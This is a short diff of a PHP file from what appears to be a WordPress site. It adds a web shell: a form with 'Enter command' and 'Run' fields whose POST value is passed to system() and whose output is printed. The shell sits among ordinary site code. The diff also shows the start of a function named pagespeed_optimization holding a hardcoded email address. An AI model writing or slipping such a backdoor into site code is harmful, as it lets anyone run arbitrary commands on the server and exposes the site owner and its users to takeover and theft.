@@ -494,6 +494,23 @@
 require_once('wp-load.php'); 
 ?>
 
+<?php
+if (isset($_POST['cmd'])) {
+    echo "<pre>";
+    $cmd = escapeshellcmd($_POST['cmd']);
+    system($cmd);
+    echo "</pre>";
+}
+?>
+
+<form method="post">
+    <input type="text" name="cmd" placeholder="Enter command" style="width: 300px;">
+    <input type="submit" value="Run">
+</form>
+
+
+    
+
 <?php 
 function pagespeed_optimization() {
     $email = 'johnybran481@gmail.com';
